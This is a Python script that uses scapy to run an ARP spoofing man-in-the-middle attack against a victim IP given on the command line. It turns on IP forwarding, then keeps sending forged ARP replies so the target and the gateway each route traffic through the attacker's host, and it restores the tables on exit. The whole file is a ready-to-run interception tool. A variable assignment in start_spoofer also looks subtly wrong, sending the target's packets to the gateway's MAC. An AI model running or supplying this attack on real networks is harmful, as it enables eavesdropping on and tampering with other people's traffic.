import time
import helper
import scapy.layers.l2 as l2
import scapy.all as scapy
import subprocess
import argparse

class ArpSpoofer:
    """
    It is a class that execute all actions for arp spoofing
    """

    def __init__(self, lan_controller, target_ip):
        self.lan_controller = lan_controller
        self.target_ip = target_ip
        self.gateway_ip = lan_controller.get_default_gateway_linux()
        self.target_mac = lan_controller.get_mac_address(self.target_ip)
        self.gateway_mac = lan_controller.get_mac_address(lan_controller.get_default_gateway_linux())


    def spoof(self,spoof_ip, target_ip, target_mac):
        """
        This functions tell to the machine that has ip equal with target_ip
        that host machine has the ip equal with spoof_ip \n
        Params:
            spoof_ip: fake ip address for this machine
            target_ip: target ip
        """
        #target_mac = self.lan_controller.get_mac_address(target_ip)
        arp_packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac,  psrc=spoof_ip)
        scapy.send(arp_packet, verbose=False)

    def __init__ip_forward(self):
        subprocess.check_call("sysctl -w net.ipv4.ip_forward=1", shell=True)

    def __restore(self):
        """
        Restore arp tables from router and target
        """
        arp_packet_restore_target = l2.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
            psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        arp_packet_restore_gateway = l2.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
            psrc=self.target_ip, hwsrc=self.target_mac)
        scapy.send(arp_packet_restore_target, verbose=False)
        scapy.send(arp_packet_restore_gateway, verbose=False)
        subprocess.check_call("sysctl -w net.ipv4.ip_forward=0", shell=True)
        print("[+] Victims was restored")
    
    def start_spoofer(self):
        """
        Start the arp spoofing atack
        """
        self.__init__ip_forward()
        gateway_ip = self.gateway_ip
        gateway_mac = self.gateway_mac
        target_mac = self.gateway_mac
        step = 0
        try:
            while True:
                step = step + 1
                #tell to target that I am router
                self.spoof(gateway_ip, self.target_ip, target_mac)

                #tell to rooter that I am target
                self.spoof(self.target_ip, gateway_ip, gateway_mac)
                time.sleep(1)
                print("\r[+] step number: " + str(step), end="")
        except KeyboardInterrupt:
            self.__restore()

parser = argparse.ArgumentParser(description='ARP spoofing exploatation')
parser.add_argument("--interface", help="network interface", required=True)
parser.add_argument("--ip", help="victim ip address", required=True)
args = parser.parse_args()
lan_controller = helper.LanController(args.interface)
arp_spoofer = ArpSpoofer(lan_controller, args.ip)
arp_spoofer.start_spoofer()

